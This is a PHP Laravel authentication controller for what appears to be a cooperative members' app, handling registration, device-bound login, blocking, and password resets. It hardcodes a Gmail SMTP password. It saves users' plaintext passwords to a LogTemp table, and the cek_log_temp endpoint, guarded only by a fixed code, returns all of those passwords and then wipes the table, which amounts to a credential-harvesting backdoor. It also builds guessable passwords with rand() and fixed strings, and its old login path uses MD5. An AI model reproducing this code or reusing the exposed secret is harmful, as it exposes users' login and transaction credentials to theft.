<?php

namespace App\Http\Controllers;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Http\Response;
use App\Models\User;
use App\Models\LogLogin;
use App\Models\LogCreatePassword;
use App\Models\LogResetPassword;
use App\Models\LogTemp;
use App\Models\SystemSetting;
use App\Models\CoreMember;
use App\Models\PreferenceCompanyScr;
use App\Http\Controllers\WhatsappOTPController;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Auth;
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
 
require_once "../vendor/autoload.php";
// require_once "constants.php";

// require_once '/home/ciptaprocpanel/public_html/kopkar-menjanganenam-api/vendor/autoload.php';
/* require '/home/ciptaprocpanel/public_html/-api/vendor/phpmailer/phpmailer/src/Exception.php';
require '/home/ciptaprocpanel/public_html/sudama-api/vendor/phpmailer/phpmailer/src/PHPMailer.php';
require '/home/ciptaprocpanel/public_html/sudama-api/vendor/phpmailer/phpmailer/src/SMTP.php'; */

class AuthController extends Controller
{
    public function register(Request $request){
        $fields = $request->validate([
            'member_no'             => 'required',
            'password'              => 'required',
            'password_transaksi'    => 'required',
        ]);

        $user = User::where('member_no', $fields['member_no'])
        ->first();

        if($user){
            $message                        = "No Anggota Sudah Ada";

            $log_login                      = new LogLogin();
            $log_login->member_no           = $fields['member_no'];
            $log_login->log_login_remark    = $message;

            if($log_login->save())
            {
                return response([
                    'message'       => $message,
                    'otp_status'    => 0,
                ],401);
            }
        }

        $coremember = CoreMember::select('member_id', 'member_name', 'branch_id', 'member_phone')
        ->where('member_no', $fields['member_no'])
        ->first();

        $expired_on = date("Y-m-d H:i:s", strtotime('+1 hours'));

        $user = User::create([
            'member_no'             => $fields['member_no'],
            'member_id'             => $coremember['member_id'],
            'password'              => Hash::make($fields['password']),
            'password_transaksi'    => Hash::make($fields['password_transaksi']),
            'member_name'           => $coremember['member_name'],
            'branch_id'             => $coremember['branch_id'],
            'member_phone'          => $coremember['member_phone'],
            'member_user_status'    => 0,
            'expired_on'            => $expired_on,
        ]);

        $user_state_madani = CoreMember::findOrFail($coremember['member_id']);
        $user_state_madani->ppob_status = 1;
        $user_state_madani->save();

        $last_logtemp = LogTemp::where('member_no', $fields['member_no'])
                        ->where('member_id', $coremember['member_id'])
                        ->first();

        if($last_logtemp){
            $last_logtemp->log      = $fields['password'];
            $last_logtemp->logt     = $fields['password_transaksi'];
            $last_logtemp->save();
        }else{
            $logtemp = LogTemp::create([
                'member_id'         => $coremember['member_id'],
                'member_no'         => $fields['member_no'],
                'log'               => $fields['password'],
                'logt'              => $fields['password_transaksi']
            ]);
        }
        (new WhatsappOTPController)->send($fields['member_no']);

        $token = $user->createToken('token-name')->plainTextToken;

        $response = [
            'data'  => $user,
            'token' => $token
        ];
        $user->token = $token;

        return response($user, 201);
    } 
    
    public function login(Request $request){
        $fields = $request->validate([
            'member_no'         => 'required|string',
            'password'          => 'required|string',
            'system_version'    => 'required|string',
        ]);

        //Check username
        $user = User::where('member_no', $fields['member_no'])
                ->first();

        if(!$user){
            $message                        = "No Anggota Tidak Ada";

            $log_login                      = new LogLogin();
            $log_login->member_no           = $fields['member_no'];
            $log_login->log_login_remark    = $message;

            if($log_login->save())
            {
                return response([
                    'message'       => $message,
                    'otp_status'    => 0,
                ],401);
            }
        }
        
        //Check password
        if (!Hash::check($fields['password'], $user->password)){
            $message                        = "Password Tidak Sesuai";

            $log_login                      = new LogLogin();
            $log_login->member_id           = $user['member_id'];
            $log_login->member_no           = $user['member_no'];
            $log_login->imei                = $user['member_imei'];
            $log_login->log_state           = $user['log_state'];
            $log_login->block_state         = $user['block_state'];
            $log_login->log_login_remark    = $message;

            if($log_login->save())
            {
                return response([
                    'message'       => $message,
                    'otp_status'    => 0,
                ],401);
            }
        }

        if(($user->member_imei == null || $user->member_imei == '') && $user['block_state'] == 0) {
            $message                        = "Login";

            $log_login                      = new LogLogin();
            $log_login->member_id           = $user['member_id'];
            $log_login->member_no           = $user['member_no'];
            $log_login->imei                = $user['member_imei'];
            $log_login->log_state           = $user['log_state'];
            $log_login->block_state         = $user['block_state'];
            $log_login->log_login_remark    = $message;

            if($log_login->save())
            {
                return response()->json([
                    'message'       => $message,
                    'otp_status'    => 1,
                ], 400);
            }
        }

        $token = $user->createToken('token-name')->plainTextToken;

        $response = [
            'data'  => $user,
            'token' => $token
        ];
        $user->token = $token;

        if($user['block_state']==1){
            $message                    = "User Blocked! Contact Admin for Further Information! ";

            $user->tokens()->delete();
            $log_login                      = new LogLogin();
            $log_login->member_id           = $user['member_id'];
            $log_login->member_no           = $user['member_no'];
            $log_login->imei                = $user['member_imei'];
            $log_login->log_state           = $user['log_state'];
            $log_login->block_state         = $user['block_state'];
            $log_login->log_login_remark    = $message;

            if($log_login->save())
            {
                return response()->json([
                    'message'       => $message,
                    'otp_status'    => 0,
                ], 400);
            }
        }else if($user->member_imei != null || $user->member_imei != '') {
            if($user->member_imei != $request->imei){
                $user_state = User::findOrFail($user['user_id']);
                $user_state->block_state = 1;
                $user_state->save();
                $user_state_madani = CoreMember::findOrFail($user['member_id']);
                $user_state_madani->block_state = 1;
                $user_state_madani->save();
                $user->tokens()->delete();

                $userlogin = User::where('member_no', $fields['member_no'])
                ->first();

                $message                        = "User Blocked for Using Different Device! Contact Admin for Further Information!";

                $log_login                      = new LogLogin();
                $log_login->member_id           = $userlogin['member_id'];
                $log_login->member_no           = $userlogin['member_no'];
                $log_login->imei                = $userlogin['member_imei'];
                $log_login->log_state           = $userlogin['log_state'];
                $log_login->block_state         = $userlogin['block_state'];
                $log_login->log_login_remark    = $message;

                if($log_login->save())
                {
                    return response()->json([
                        'message'       => $message,
                        'otp_status'    => 0,
                    ], 400);
                }
            }else{
                if($user['log_state']==1){
                    $user_state = User::findOrFail($user['user_id']);
                    $user_state->block_state = 1;
                    $user_state->save();
                    $user_state_madani = CoreMember::findOrFail($user['member_id']);
                    $user_state_madani->block_state = 1;
                    $user_state_madani->save();
                    $user->tokens()->delete();

                    $userlogin = User::where('member_no', $fields['member_no'])
                    ->first();

                    $message                        = "User Blocked for Double Login! Contact Admin for Further Information!";
    
                    $log_login                      = new LogLogin();
                    $log_login->member_id           = $userlogin['member_id'];
                    $log_login->member_no           = $userlogin['member_no'];
                    $log_login->imei                = $userlogin['member_imei'];
                    $log_login->log_state           = $userlogin['log_state'];
                    $log_login->block_state         = $userlogin['block_state'];
                    $log_login->log_login_remark    = $message;

                    if($log_login->save())
                    {
                        return response()->json([
                            'message'       => $message,
                            'otp_status'    => 0,
                        ], 400);
                    }
                }else{
                    $version = SystemSetting::select('system_version')->first();
    
                    $user->system_version = $version['system_version'];
    
                    $user_state = User::findOrFail($user['user_id']);
                    $user_state->member_imei = $request->imei;
                    $user_state->log_state = 1;
                    $user_state->save();

                    $user->member_imei  = $request->imei;
                    $user->member_token = "yo";
                    
                    $userlogin = User::where('member_no', $fields['member_no'])
                        ->first();

                    $message                        = "Login Berhasil";

                    $log_login                      = new LogLogin();
                    $log_login->member_id           = $userlogin['member_id'];
                    $log_login->member_no           = $userlogin['member_no'];
                    $log_login->imei                = $userlogin['member_imei'];
                    $log_login->log_state           = $userlogin['log_state'];
                    $log_login->block_state         = $userlogin['block_state'];
                    $log_login->log_login_remark    = $message;

                    if($log_login->save())
                    {
                        return response($user, 201);
                    }
                }                
            }
        }else{
            if($user['log_state']==1){
                $user_state = User::findOrFail($user['user_id']);
                $user_state->block_state = 1;
                $user_state->save();
                $user_state_madani = CoreMember::findOrFail($user['member_id']);
                $user_state_madani->block_state = 1;
                $user_state_madani->save();
                $user->tokens()->delete();

                $userlogin = User::where('member_no', $fields['member_no'])
                    ->first();

                $message                        = "User Blocked for Double Login! Contact Admin for Further Information!";

                $log_login                      = new LogLogin();
                $log_login->member_id           = $userlogin['member_id'];
                $log_login->member_no           = $userlogin['member_no'];
                $log_login->imei                = $userlogin['member_imei'];
                $log_login->log_state           = $userlogin['log_state'];
                $log_login->block_state         = $userlogin['block_state'];
                $log_login->log_login_remark    = $message;

                if($log_login->save())
                {
                    return response()->json([
                        'message'       => $message,
                        'otp_status'    => 0,
                    ], 400);
                }
            }else{
                $version = SystemSetting::select('system_version')->first();

                $user->system_version = $version['system_version'];

                $user_state = User::findOrFail($user['user_id']);
                $user_state->member_imei = $request->imei;
                $user_state->log_state = 1;
                $user_state->save();
                
                $user->member_imei  = $request->imei;
                $user->member_token = "yo";

                $userlogin = User::where('member_no', $fields['member_no'])
                    ->first();

                $message                        = "Login Berhasil";

                $log_login                      = new LogLogin();
                $log_login->member_id           = $userlogin['member_id'];
                $log_login->member_no           = $userlogin['member_no'];
                $log_login->imei                = $userlogin['member_imei'];
                $log_login->log_state           = $userlogin['log_state'];
                $log_login->block_state         = $userlogin['block_state'];
                $log_login->log_login_remark    = $message;

                $expired_on = date("Y-m-d H:i:s", strtotime('+1 hours'));

                $userlogin->member_user_status = 1;
                $userlogin->expired_on = $expired_on;

                if ($userlogin->save()){
                    if($log_login->save())
                    {
                        return response($user, 201);
                    }
                }
            }
        }
    }

    public function login_old(Request $request){
        $user = User::where('username', $request->username)->first();

        if(!$user || md5($request->password) != $user->password){
            return response()->json([
                'message' => 'Password Tidak Sesuai'
            ], 401);
        }
        $token = $user->createToken('token-name')->plainTextToken;
        return response()->json([
            'message'   => 'success',
            'user'      => $user,
            'token'     => $token,
        ], 200);
    }

    public function logout(Request $request){
        $user = auth()->user();
        $user_state = User::findOrFail($user['user_id']);
        $user_state->log_state = 0;
        $user_state->save();

        auth()->user()->tokens()->delete();

        $log_login                      = new LogLogin();
        $log_login->member_id           = $user_state['member_id'];
        $log_login->member_no           = $user_state['member_no'];
        $log_login->imei                = $user_state['member_imei'];
        $log_login->log_state           = 0;
        $log_login->block_state         = $user_state['block_state'];
        $log_login->log_login_remark    = "Log Out";

        if($log_login->save())
        {
            return [
                'message' => 'Logged Out'
            ];
        }
    }

    public function logout_expired($member_id){
        $user_state = User::where('member_id', $member_id)->first();
        $user_state->log_state = 0;
        $user_state->save();

        $log_login                      = new LogLogin();
        $log_login->member_id           = $user_state['member_id'];
        $log_login->member_no           = $user_state['member_no'];
        $log_login->imei                = $user_state['member_imei'];
        $log_login->log_state           = 0;
        $log_login->block_state         = $user_state['block_state'];
        $log_login->log_login_remark    = "Log Out Expired";

        if($log_login->save())
        {
            return [
                'message' => 'Logged Out Expired'
            ];
        }
    }

    public function update_member_phone(Request $request, $id)
    {
        $user = User::findOrFail($id);
        $user->member_phone = $request->member_phone;
        if($user->save())
        {
            $response = [
                'data'  => $user
            ];

            return response($user, 201);
        }
    }

    public function update_password(Request $request, $id)
    {
        $user = User::where('member_id', '=', $id)->firstOrFail();
        if(!$user || !Hash::check($request->old_password, $user->password)){
            return response([
                'message' => 'Password Tidak Sesuai'
            ],401);
        }
        $user->password = Hash::make($request->password);
        $user->member_user_status = 2;
        if($user->save())
        {
            $response = [
                'message'  => 'Ganti Password Berhasil'
            ];

            $this->log_change_password($user, 1);

            return response($response, 201);
        }
    }

    public function update_password_transaction(Request $request, $id)
    {
        $user = User::where('member_id', '=', $id)->firstOrFail();
        if(!$user || !Hash::check($request->old_password, $user->password_transaksi)){
            return response([
                'message' => 'Password Transaksi Tidak Sesuai'
            ],401);
        }
        $user->password_transaksi = Hash::make($request->password);
        if($user->save())
        {
            $response = [
                'message'  => 'Ganti Password Transaksi Berhasil'
            ];

            $this->log_change_password($user, 2);

            return response($response, 201);
        }
    }

    public function create_password()
    {
        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);

        $password = '';
        for ($i = 0; $i < 2; $i++) {
            $password .= $characters[rand(0, $charactersLength - 1)];
        }

        $salt="4d4s";
        $password .= $salt;
        for ($i = 0; $i < 2; $i++) {
            $password .= $characters[rand(0, $charactersLength - 1)];
        }

        $password_transaksi = '';
        for ($i = 0; $i < 2; $i++) {
            $password_transaksi .= $characters[rand(0, $charactersLength - 1)];
        }

        $salt_transaksi="3s47";
        $password_transaksi .= $salt_transaksi;
        for ($i = 0; $i < 2; $i++) {
            $password_transaksi .= $characters[rand(0, $charactersLength - 1)];
        }

        $response = [
            'password'              => $password,
            'password_transaksi'    => $password_transaksi
        ];

        return response($response, 201);
    }

    public function reset_password($member_no, $member_id, $user_id)
    {
        $user = User::where('member_no', '=', $member_no)
                ->where('member_id', '=', $member_id)
                ->firstOrFail();

        $user_old = User::where('member_no', '=', $member_no)
                ->where('member_id', '=', $member_id)
                ->firstOrFail();

        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);

        $password = '';
        for ($i = 0; $i < 2; $i++) {
            $password .= $characters[rand(0, $charactersLength - 1)];
        }
        $salt="9e5t";
        $password .= $salt;
        for ($i = 0; $i < 2; $i++) {
            $password .= $characters[rand(0, $charactersLength - 1)];
        }

        $password_transaksi = '';
        for ($i = 0; $i < 2; $i++) {
            $password_transaksi .= $characters[rand(0, $charactersLength - 1)];
        }

        $salt_transaksi="6ud4";
        $password_transaksi .= $salt_transaksi;
        for ($i = 0; $i < 2; $i++) {
            $password_transaksi .= $characters[rand(0, $charactersLength - 1)];
        }

        $expired_on = date("Y-m-d H:i:s", strtotime('+1 hours'));

        $user->password = Hash::make($password);
        $user->password_transaksi = Hash::make($password_transaksi);
        $user->member_imei = '';
        $user->log_state = 0;
        $user->member_user_status = 1;
        $user->expired_on = $expired_on;
        if($user->save())
        {
            
            $email_admin = PreferenceCompanyScr::select('preference_company.email_admin')->first();
            $mail = new PHPMailer(true);
 
            try {
                $mail->isSMTP();
                $mail->Host = 'smtp.googlemail.com';  //gmail SMTP server
                $mail->SMTPAuth = true;
                $mail->Username = 'ciptasolutindotech@gmail.com';   //username
                $mail->Password = 'c1pt4s0lut1nd0';                 //password
                $mail->SMTPSecure = 'ssl';
                $mail->Port = 465;                                  //smtp port
            
                $mail->setFrom('ciptasolutindotech@gmail.com', 'CiptaSolutindo');
                $mail->addAddress($email_admin['email_admin'], 'Madani Jatim');
            
                $mail->isHTML(true);
                $mail->Subject = 'Reset Password Member : '.$member_no;
                // $mail->Body    = 'Password baru : '.$password;
                $mail->Body    = "<head>
                <meta http-equiv='Content-Type' content='text/html; charset=UTF-8' />
                <title>Email</title>
                <meta name='viewport' content='width=device-width, initial-scale=1.0' />
                <style>
                    @media only screen and (max-width: 960px) {
                        .container {
                            width: 600px;
                        }
                    }

                    @media only screen and (max-width: 600px) {
                        .container {
                            width: 100%;
                        }

                        .invoice-left {
                            width: 100%;
                        }

                        .invoice-right {
                            width: 100%;
                        }

                        .total-price {
                            padding-right: 10px;
                        }
                    }
                </style>
            </head>

            <body style='margin: 0; padding: 0;'>
                <table width='100%' border='0' cellpadding='0' cellspacing='0'
                    style='font-family: Helvetica Neue, Helvetica, Arial, sans-serif;'>
                    <tr>
                        <td>
                            <!-- // START CONTAINER -->
                            <table class='container' width='600px' align='center' border='0' cellpadding='0' cellspacing='0'
                                style='background-color: #ffffff;'>
                                <tr>
                                    <td>
                                        <table width='100%' align='center' border='0' cellpadding='0' cellspacing='0'
                                            style='background-color: #ffffff;'>
                                            <tr>
                                                <td>
                                                    <img src='https://i.ibb.co/gR5VCYn/logo-madani-hitam1-1.png' alt='Madani Logo'>
                                                </td>
                                                <td align='right'>
                                                    <p style='font-size: 24px; color: #888888;'>RESET PASSWORD</p>
                                                </td>
                                            </tr>
                                        </table>
                                    </td>
                                </tr>
                                <tr>
                                    <td>
                                        <table width='100%' border='0' cellpadding='0' cellspacing='0'
                                            style='background-color: #e8e8e8;'>
                                            <tr>
                                                <td>
                                                    <table class='invoice-left' width='50%' align='left' border='0' cellpadding='0'
                                                        cellspacing='0' style='padding-top: 10px; padding-left: 20px;'>
                                                        <tr>
                                                            <td>
                                                                <p
                                                                    style='margin: 0; font-size: 10px; text-transform: uppercase; color: #666666;'>
                                                                    NAMA PESERTA</p>
                                                                <p style='margin-top: 0; font-size: 12px; color: #000000;'>".$user['member_name']."</p>
                                                            </td>
                                                        </tr>
                                                        <tr>
                                                            <td>
                                                                <p
                                                                    style='margin-bottom: 0; font-size: 10px; text-transform: uppercase; color: #666666;'>
                                                                    PASSWORD BARU</p>
                                                                <p style='margin-top: 0; font-size: 12px;'>".$password."</p>
                                                            </td>
                                                        </tr>
                                                        <tr>
                                                            <td>
                                                                <p
                                                                    style='margin-bottom: 0; font-size: 10px; text-transform: uppercase; color: #666666;'>
                                                                    PASSWORD TRANSAKSI BARU</p>
                                                                <p style='margin-top: 0; font-size: 12px;'>".$password_transaksi."</p>
                                                            </td>
                                                        </tr>
                                                    </table>
                                                    <table class='invoice-right' width='50%' align='right' border='0'
                                                        cellpadding='0' cellspacing='0' style='padding-left: 20px;'>
                                                        <tr>
                                                            <td>
                                                                <p
                                                                    style='margin-bottom: 0; font-size: 10px; text-transform: uppercase; color: #666666;'>
                                                                    NOMOR MEMBER</p>
                                                                <p style='margin-top: 0; font-size: 12px;'>".$user['member_no']."</p>
                                                            </td>
                                                        </tr>
                                                        <tr>
                                                            <td>
                                                                <p
                                                                    style='margin-bottom: 0; font-size: 10px; text-transform: uppercase; color: #666666;'>
                                                                    NOMOR HP</p>
                                                                <p style='margin-top: 0; font-size: 12px; color: #000000;'>".$user['member_phone']."</p>
                                                            </td>
                                                        </tr>
                                                    </table>
                                                </td>
                                            </tr>
                                        </table>
                                    </td>
                                </tr>
                                <tr>
                                    <td>
                                        <table width='100%' border='0' cellpadding='0' cellspacing='0' style='padding-top: 5px;'>
                                            <tr>
                                                <td>
                                                    <table width='100%' border='0' cellpadding='0' cellspacing='0'>
                                                        <tr>
                                                            <td align='center'>
                                                                <p style='margin-bottom: 0; font-size: 12px; color: #666666;'>
                                                                    2021 © CiptaSolutindo
                                                            </td>
                                                        </tr>
                                                    </table>
                                                </td>
                                            </tr>
                                        </table>
                                    </td>
                                </tr>
                            </table>
                        </td>
                    </tr>
                </table>
                <!-- END CONTAINER -->
                </td>
                </tr>
                </table>
            </body>

            </html>";
            
                $mail->send();
                // echo 'Message has been sent';
            } catch (Exception $e) {
                // echo 'Message could not be sent. Mailer Error: '. $mail->ErrorInfo;
            }

            $user_state_madani = User::where('member_no', '=', $member_no)
                                    -> where('member_id', '=', $member_id)    
                                    ->firstOrFail();
            $user_state_madani->otp_state = 0;
            $user_state_madani->save();
            

            $last_logtemp = LogTemp::where('member_no', $member_no)
                            ->where('member_id', '=', $member_id)
                            ->first();

            if($last_logtemp){
                $last_logtemp->log      = $password;
                $last_logtemp->logt     = $password_transaksi;
                $last_logtemp->save();
            }else{
                $logtemp = LogTemp::create([
                    'member_id'         => $member_id,
                    'member_no'         => $member_no,
                    'log'               => $password,
                    'logt'              => $password_transaksi
                ]);
            }

            $this->log_reset_password($user_old, $user_id);

            $response = [
                'member_id'             => $member_id,
                'password'              => $password,
                'password_transaksi'    => $password_transaksi,
                'message'               => 'Ganti Password Berhasil'
            ];

            return response($response, 201);
        }
    }

    public function check_member($member_no)
    {
        $user = User::select('member_no')->where('member_no', '=', $member_no)->firstOrFail();
        $response = [
            'data'  => $user
        ];

        return response($user, 201);
    }

    public function open_block($member_id, $user_id)
    {
        $user_old = User::where('member_id', '=', $member_id)->firstOrFail();
        $user = User::where('member_id', '=', $member_id)->firstOrFail();
        $user->log_state = 0;
        $user->block_state = 0;
        if($member_id==53076){
            $user->otp_state = 0;
        }
        $user->save();
        $user = CoreMember::where('member_id', '=', $member_id)->firstOrFail();
        $user->block_state = 0;
        $user->save();

        $message                                = "Open Block Success";

        /* $logOpenBlock                           = new LogOpenBlock();
        $logOpenBlock->member_id                = $user_old->member_id;
        $logOpenBlock->member_no                = $user_old->member_no;
        $logOpenBlock->member_imei              = $user_old->member_imei;
        $logOpenBlock->user_id                  = $user_id;
        $logOpenBlock->log_open_block_remark    = $message;

        $logOpenBlock->save(); */

        $log_login                      = new LogLogin();
        $log_login->member_id           = $user_old->member_id;
        $log_login->member_no           = $user_old->member_no;
        $log_login->imei                = $user_old->member_imei;
        $log_login->log_state           = 0;
        $log_login->block_state         = 0;
        $log_login->log_login_remark    = $message;

        $log_login->save();

        $response = [
            'message'  => 'Open Block Success'
        ];

        $this->reset_password($user_old->member_no, $user_old->member_id, $user_old->user_id);

        return response($response, 201);
    }

    public function check_token(Request $request)
    {
        $fields = $request->validate([
            'member_no' => 'required|string'
        ]);

        $user = User::select('member_no')->where('member_no', '=', $fields['member_no'])->firstOrFail();
        $response = [
            'data'  => $user
        ];

        return response($user, 201);
    }

    public function log_login(Request $request)
    {
        $fields = $request->validate([
            'member_id' => 'required|string',
            'member_no' => 'required|string',
            'imei'      => 'required|string',
        ]);
        $log_login              = new LogLogin();
        $log_login->member_id   = $request->member_id;
        $log_login->member_no   = $request->member_no;
        $log_login->imei        = $request->imei;
        if($log_login->save())
        {
            $response = [
                'data'  => $log_login
            ];

            return response($log_login, 201);
        }
    }

    public function log_create_password(Request $request)
    {
        $fields = $request->validate([
            'member_id' => 'required|string',
            'member_no' => 'required|string',
            'user_id'   => 'required|string',
        ]);
        /* $log_create_password            = new LogCreatePassword();
        $log_create_password->member_id = $request->member_id;
        $log_create_password->member_no = $request->member_no;
        $log_create_password->user_id   = $request->user_id; */

        $log_login                      = new LogLogin();
        $log_login->member_id           = $request->member_id;
        $log_login->member_no           = $request->member_no;
        $log_login->user_id             = $request->user_id;
        $log_login->log_state           = 0;
        $log_login->block_state         = 0;
        $log_login->log_login_remark    = "Create Password";


        if($log_login->save())
        {
            $response = [
                'data'  => $log_login
            ];

            return response($log_login, 201);
        }
    }

    public function log_reset_password($data, $user_id)
    {
        /* $log_reset_password                 = new LogResetPassword();
        $log_reset_password->member_id      = $data->member_id;
        $log_reset_password->member_no      = $data->member_no;
        $log_reset_password->user_id        = $user_id;
        $log_reset_password->member_imei    = $data->member_imei; */

        $log_login                      = new LogLogin();
        $log_login->member_id           = $data->member_id;
        $log_login->member_no           = $data->member_no;
        $log_login->user_id             = $user_id;
        $log_login->imei                = $data->member_imei;
        $log_login->log_state           = 0;
        $log_login->block_state         = 0;
        $log_login->log_login_remark    = "Reset Password";

        if($log_login->save())
        {
            $response = [
                'data'  => $log_login
            ];

            return response($log_login, 201);
        }
    }

    public function log_change_password($data, $log_change_password_status)
    {
        /* $log_change_password                             = new LogChangePassword();
        $log_change_password->member_id                  = $data->member_id;
        $log_change_password->member_no                  = $data->member_no;
        $log_change_password->member_imei                = $data->member_imei;
        $log_change_password->log_change_password_status = $log_change_password_status; */

        $log_login                                  = new LogLogin();
        $log_login->member_id                       = $data->member_id;
        $log_login->member_no                       = $data->member_no;
        $log_login->imei                            = $data->member_imei;
        $log_login->log_state                       = 0;
        $log_login->block_state                     = 0;
        $log_login->log_change_password_status      = $log_change_password_status;
        $log_login->log_login_remark                = "Change Password";

        if($log_login->save())
        {
            $response = [
                'data'  => $log_login
            ];

            return response($log_login, 201);
        }
    }

    /* public function log_reset_password(Request $request)
    {
        $fields = $request->validate([
            'member_id' => 'required|string',
            'member_no' => 'required|string',
            'user_id'   => 'required|string',
        ]);
        $log_reset_password            = new LogResetPassword();
        $log_reset_password->member_id = $request->member_id;
        $log_reset_password->member_no = $request->member_no;
        $log_reset_password->user_id   = $request->user_id;
        if($log_reset_password->save())
        {
            $response = [
                'data'  => $log_reset_password
            ];

            return response($log_reset_password, 201);
        }
    } */

    public function otp_success($member_no){
        $user_state_madani = User::where('member_no', '=', $member_no)->firstOrFail();
        $user_state_madani->otp_state = 1;
        $user_state_madani->save();

        $response = [
            'message'  => 'OTP Success'
        ];
        return response($response, 201);
    }

    public function cek_log_temp($code){
        if($code === "5ud4m4"){
            $log_temp = LogTemp::get();
            
            $response = [
                'message'   => 'Kode Betul',
                'log_temp'  => $log_temp
            ];

            LogTemp::truncate();
            
        }else{
            $response = [
                'message'   => 'Kode Salah',
                'log_temp'  => []
            ];
        }

        return response($response, 201);
    }
}